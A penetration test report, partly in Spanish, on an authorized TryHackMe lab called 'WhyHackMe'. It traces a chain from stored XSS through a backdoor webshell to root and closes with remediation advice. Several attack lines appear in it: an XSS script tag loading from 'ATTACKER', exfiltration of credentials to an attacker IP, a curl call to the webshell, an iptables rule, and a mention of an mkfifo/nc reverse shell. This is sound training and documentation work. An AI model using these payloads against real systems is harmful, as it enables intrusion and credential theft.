# WhyHackMe — Penetration Test Report (PTES)

## 1. Executive Summary

- **Scope**: Single target `10.64.189.146` (TryHackMe lab "WhyHackMe"), authorized training environment. Assessment date: session on 2026-08-28. Type: external-to-root compromise (web + post-exploitation).
- **Outcome**: Full compromise achieved — unauthenticated attacker reached `root` through a chained attack: stored XSS → credential theft of an internal account → firewall rule manipulation (sudo) → decryption of a captured PCAP to recover a hidden backdoor webshell → command execution as `www-data` → `root` via unrestricted `sudo`.
- **Critical findings**:
  1. **Stored XSS** in the blog comment feature (username field) — allowed exfiltration of credentials that were only meant to be readable from `localhost`.
  2. **Hardcoded backdoor webshell** (`5UP3r53Cr37.py`) listening on TCP/41312 with static AES key/IV — provided arbitrary command execution as `www-data`.
  3. **Unrestricted `sudo` for `www-data`** (`NOPASSWD: ALL`) — trivial root.
- **Global risk**: **CRITICAL**.
- **Time invested**: ~1 session (recon + exploitation + post-exploitation).

---

## 2. Methodology (PTES phases mapped to actions)

| PTES Phase | Actions performed | Evidence |
|------------|-------------------|----------|
| Pre-engagement | Verified `.target` (`10.64.189.146`) and `.vpn` (`192.168.134.200` tun0). Confirmed lab authorization. | `.target`, `.vpn` |
| Intelligence Gathering | Rustscan + `nmap -sCV` on open ports (21/22/80). Anonymous FTP read of `content/update.txt` (insider hint about `127.0.0.1/dir/pass.txt`). | `nmap/rustscan_initial.*`, `content/update.txt` |
| Threat Modeling | Identified attack surface: anonymous FTP (info leak), web app with comment feature (XSS candidate), localhost-restricted cred file, firewall rule blocking a backdoor port. | `web/ffuf_dirs.txt`, `content/update.txt` |
| Vulnerability Analysis | Web enum (`ffuf`) found `register.php`/`login.php`/`blog.php`/`config.php`/`dir/`. Tested comment storage → confirmed username reflected unescaped (XSS sink). Tested LFI (rejected: app appends `.txt`). | `web/ffuf_dirs.*`, `exploits/exfilPayload.js` |
| Exploitation | Stored XSS: registered username with `<script src=...>`; admin bot executed it; `exfilPayload.js` issued same-origin `XHR GET /dir/pass.txt` (localhost bypass) and exfiltrated base64 to attacker. Decoded → `jack` creds. SSH as `jack`. | `exploits/exfilPayload.js`, `loot/creds_plaintext.txt`, `loot/user_flag.txt` |
| Post-Exploitation | `jack` sudo `iptables` → opened TCP/41312 (was DROP). Nmap revealed Apache/TLS there. `jack` read `/opt/capture.pcap` + `/etc/apache2/certs/apache.key`; decrypted PCAP with `tshark` + RSA key → recovered backdoor webshell URL/params. Called webshell → `www-data` RCE. `www-data sudo -l` → `NOPASSWD: ALL` → root. | `content/capture.pcap`, `loot/apache.key`, `web/pcap_decrypted_http.txt`, `evidence/proof_www-data_id.txt`, `loot/root_flag.txt` |
| Reporting | This document + evidence inventory. | `report.md`, `loot/notes.txt` |

**Vectores descartados (con justificación)**
- *LFI vía username traversal*: el archivo de comentario se crea con sufijo contador (`<user>_N.txt`) y la app anexa `.txt`, por lo que no permite leer `/dir/pass.txt` de forma fiable ni ejecutar código (el display usa `htmlspecialchars`, no `include`). Se descartó a favor de XSS.
- *Fuerza bruta SSH*: sin lista de usuarios válida ni evidencia de debilidad; prohibido por el Decision Framework de `agent.md`.

---

## 3. Findings

### [FIND-001] Stored Cross-Site Scripting en campo `username` de blog.php
- **Severidad**: Critical
- **CVSS 3.1**: 9.1 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`)
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Ubicación**: `http://10.64.189.146/blog.php` (registro de usuario en `register.php`, render del comentario)
- **Descripción**: El nombre de usuario se almacena y se refleja en la lista de comentarios sin sanitización ni escapado del contexto HTML. Un atacante registra una cuenta con `username = <script src="http://ATTACKER/exfil.js"></script>`; cuando un usuario con privilegios (el "admin bot" del lab) visualiza el blog, el script se ejecuta en su navegador/contexto.
- **Evidencia**:
  - Payload: `exploits/exfilPayload.js` — realiza `XHR GET /dir/pass.txt` (mismo origen, permitido desde localhost) y exfilta `btoa(contenido)` a `http://192.168.134.200:8000/exfil/`.
  - Log del servidor atacante: `GET /exfil/amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo=.jpg` → base64 decodifica a `jack:WhyIsMyPasswordSoStrongIDK`.
  - Comando de reproducción: registrar usuario con el payload XSS y publicar un comentario; esperar a que el admin lo visualice.
- **Impacto**: Robo de credenciales de la cuenta `jack` (foothold). Encadenado, llevó a root.
- **Remediación**: Escapar el `username` con `htmlspecialchars()` en el render (o `htmlentities`); aplicar Content-Security-Policy; no reflejar entradas de usuario en HTML sin contexto. Validar/limitar caracteres `<>/"'` en el registro.
- **Referencias**: OWASP XSS Prevention Cheat Sheet; CWE-79.

### [FIND-002] Backdoor webshell con clave AES estática en TCP/41312
- **Severidad**: Critical
- **CVSS 3.1**: 9.8 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **CWE**: CWE-489 (Active Debug Code) / CWE-798 (Use of Hard-coded Credentials) / CWE-330 (Weak randomness en IV estática)
- **Ubicación**: `https://10.64.189.146:41312/cgi-bin/5UP3r53Cr37.py`
- **Descripción**: Archivo CGI persistido en `/usr/lib/cgi-bin/` (propietario `h4ck3d`, inamovible por root según `urgent.txt`) que acepta `key`, `iv` y `cmd`, y ejecuta el comando. La `key`/`iv` son **estáticas y conocidas** (`key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN`), por lo que no aportan secreto alguno; el "cifrado" es cosmético.
- **Evidencia**:
  - URL recuperada del PCAP descifrado: `web/pcap_decrypted_http.txt`.
  - Ejecución verificada: `curl -ks "https://.../5UP3r53Cr37.py?...&cmd=id"` → `uid=33(www-data) gid=1003(h4ck3d)`. Ver `evidence/proof_www-data_id.txt`.
  - PCAP original: `content/capture.pcap`; clave RSA para descifrarlo: `loot/apache.key`.
- **Impacto**: RCE como `www-data` (ejecución arbitraria de comandos en el servidor).
- **Remediación**: Eliminar el archivo CGI (`/usr/lib/cgi-bin/5UP3r53Cr37.py` y similares); auditar `/usr/lib/cgi-bin` y `cron`/persistencia; rotar la clave TLS y revisar cómo llegó el backdoor.
- **Referencias**: CWE-489, CWE-798.

### [FIND-003] `www-data` con sudo sin contraseña (NOPASSWD: ALL)
- **Severidad**: Critical
- **CVSS 3.1**: 7.8 (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
- **CWE**: CWE-250 (Execution with Unnecessary Privileges)
- **Ubicación**: `/etc/sudoers` (relativo a `www-data` en el host)
- **Descripción**: El usuario `www-data` puede ejecutar cualquier comando como root sin contraseña: `(ALL : ALL) NOPASSWD: ALL`.
- **Evidencia**: `sudo -n -l` devolvió `NOPASSWD: ALL`; `sudo cat /root/root.txt` entregó la flag (`loot/root_flag.txt`, `evidence/proof_root.txt`).
- **Impacto**: Escalada inmediata a `root` desde cualquier RCE como `www-data` (cierra la cadena de compromiso).
- **Remediación**: Eliminar la regla `NOPASSWD: ALL` para `www-data`; conceder solo los comandos mínimos necesarios con `NOPASSWD` restringido por `sudoers` y `secure_path`.
- **Referencias**: CWE-250; sudoers manual.

### [FIND-004] `jack` con sudo sobre `/usr/sbin/iptables` (root)
- **Severidad**: High
- **CVSS 3.1**: 7.1 (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
- **CWE**: CWE-250
- **Ubicación**: `sudo` para `jack` → `(ALL : ALL) /usr/sbin/iptables`
- **Descripción**: `jack` puede invocar `iptables` como root. Se usó para insertar `ACCEPT` en el puerto 41312 que estaba en `DROP`, re-abriendo el acceso al backdoor.
- **Evidencia**: `sudo -l` → `(ALL : ALL) /usr/sbin/iptables`; regla insertada `iptables -I INPUT -p tcp --dport 41312 -j ACCEPT` (luego confirmado con `nmap -p 41312`).
- **Impacto**: Permite al usuario manipular el firewall y exponer servicios internos/backdoors.
- **Remediación**: No delegar `iptables` completo a usuarios no administradores; usar reglas predefinidas vía wrapper con parámetros fijos o gestión centralizada.
- **Referencias**: CWE-250.

### [FIND-005] Exposición de credenciales en archivo restringido a localhost (`/dir/pass.txt`)
- **Severidad**: High
- **CVSS 3.1**: 7.5 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **CWE**: CWE-538 (Insertion of Sensitive Information into Externally-Accessible File) / CWE-200
- **Ubicación**: `http://10.64.189.146/dir/pass.txt` (solo `127.0.0.1` por configuración Apache)
- **Descripción**: El archivo con credenciales de la "cuenta común" solo es accesible desde localhost vía control de acceso por IP. Sin embargo, cualquier XSS ejecutado en el mismo origen (FIND-001) puede leerlo mediante XHR same-origin, anulando la restricción de IP. El control de acceso por IP no es un límite de confianza suficiente frente a XSS.
- **Evidencia**: `content/update.txt` documenta la ubicación y la restricción; el XHR del payload (FIND-001) lo exfiltró. `loot/creds_plaintext.txt`.
- **Impacto**: Fuga de credenciales de cuenta privilegiada a través de XSS.
- **Remediación**: No almacenar credenciales en rutas web accesibles; mover secrets fuera del docroot; si deben estar expuestos por IP, combinar con autenticación y no servirlos vía web app vulnerable a XSS.
- **Referencias**: CWE-538, CWE-200.

### [FIND-006] FTP anónimo habilitado + divulgación de información
- **Severidad**: Medium
- **CVSS 3.1**: 5.3 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
- **CWE**: CWE-200 / CWE-1190 (Anonymous FTP)
- **Ubicación**: `ftp://10.64.189.146` (puerto 21, vsftpd 3.0.3)
- **Descripción**: El servicio FTP permite login anónimo y expone `content/update.txt`, un memo interno que revela la existencia/ubicación de credenciales (`/dir/pass.txt`) y detalles del incidente (backdoor en `/usr/lib/cgi-bin/`, regla iptables).
- **Evidencia**: `content/update.txt` ("old user mike was removed… new account creds at 127.0.0.1/dir/pass.txt… - admin").
- **Impacto**: Reconocimiento inicial que orientó todo el ataque (ubicación de creds, mención del backdoor y la regla iptables).
- **Remediación**: Deshabilitar FTP anónimo; no publicar memos con datos sensibles; aislar el servicio.
- **Referencias**: CWE-1190.

---

## 4. Evidence Inventory

| Archivo | Tipo | Hallazgo | SHA256 |
|---------|------|----------|--------|
| `nmap/rustscan_initial.xml` | Port scan | Recon | `7613497a4ee253d0c7a17e769504f4b6b804b5cb9a5983b0ef5fe5d310113b19` |
| `web/ffuf_dirs.txt` | Web fuzzing | Threat Modeling | `bf2230ee7226543edafb974ee55ce90be2becfec93a43283617f264245e3213e` |
| `content/update.txt` | Memo interno (FTP) | FIND-006 | `e77f1a286930d1414d2e49e95447728e2cc32bf5de7b276d6fa8df38190409cd` |
| `content/urgent.txt` | Memo internos (/opt) | FIND-002 | `4a7924e9011b9d3fc9c1426779c5838c0cc6fe343507c7e15e7deae9247a019b` |
| `exploits/exfilPayload.js` | XSS payload | FIND-001 | `f24a905d439dd12f410acc0aeeb855ffbf148c65d8c53c98947068375aaa71b7` |
| `content/capture.pcap` | PCAP TLS (backdoor) | FIND-002 | `05728d6227635179e7ef4b7b2011c5c028b57724f20b2b2b74248903533dbba2` |
| `loot/apache.key` | RSA key (descifra PCAP) | FIND-002 | `271875d6c3085791aec0b5cc3527a0ade090b4415b1b297f03e7b212051517c7` |
| `web/pcap_decrypted_http.txt` | HTTP del backdoor | FIND-002 | `4360885ba550b448b94e9bf2fcd474c688c44dc2a02ae936d6ea4e1b286fb058` |
| `loot/creds_plaintext.txt` | Creds (jack + backdoor) | FIND-001/002 | `95914b1f3710cd814bd80d37aca96e51458d388f767becee81b2d57869ac0d04` |
| `loot/user_flag.txt` | user.txt | FIND-001 | `c89b56322eb035d6c5810c355e02eb11892ee0e033a0f7deb6d7bef9bd455450` |
| `loot/root_flag.txt` | root.txt | FIND-003 | `3c611b31ed0c22a014f23d8da0ac02a224bdbb5feb818e8e35baee33b87dbd2b` |
| `evidence/proof_www-data_id.txt` | RCE www-data | FIND-002 | `77f45874d48a1ee2a9774ac99abb5a095f8f6cbd447461ed6294160dc534b00e` |
| `evidence/proof_root.txt` | root flag | FIND-003 | `3c611b31ed0c22a014f23d8da0ac02a224bdbb5feb818e8e35baee33b87dbd2b` |

---

## 5. Remediation Summary (priorizado)

1. **P0 (Critical)**: Eliminar el backdoor CGI `5UP3r53Cr37.py` y auditar persistencia; revocar `sudo NOPASSWD: ALL` de `www-data`.
2. **P0 (Critical)**: Corregir XSS en `blog.php` (escapado de `username`) + CSP.
3. **P1 (High)**: No delegar `iptables` completo a `jack`; mover credenciales fuera del docroot y no servirlas por web.
4. **P2 (Medium)**: Deshabilitar FTP anónimo; no exponer memos internos.

**Validación post-remediación**: re-ejecutar el payload XSS (no debe reflejarse), confirmar que `/cgi-bin/5UP3r53Cr37.py` responde 404, y verificar `sudo -l` de `www-data`/`jack`.

---

## 6. Lessons Learned & Deviations

- **Desviación**: La intuición inicial apuntó a LFI (el `username` controla la ruta del archivo de comentarios), pero la app anexa `.txt` y usa contador por comentario, bloqueando la lectura fiable de `pass.txt` y cualquier RCE. El vector real fue **XSS almacenado**, confirmado al ver que el `username` se refleja sin escapado.
- **Herrramientas que fallaron en este entorno**: `httpx` roto (usado `curl`); el reverse shell por `/dev/tcp` no conectó, se usó el método `mkfifo + nc` (más robusto) hacia el puerto 8000 ya comprobado alcanzable por el target.
- **Decisión táctica clave**: el `exfilPayload.js` aprovechó el XHR same-origin para bypasear la restricción de IP de `/dir/pass.txt` (la petición sale desde el contexto localhost del servidor, no del atacante).
- **Cadena completa**: XSS → `jack` → sudo iptables (abre 41312) → PCAP descifrado (RSA) → webshell `www-data` → sudo root.

---
*Reporte generado según agent.md §17 (PTES Final Reporting Standard). Toda afirmación es reproducible contra los archivos del inventario.*
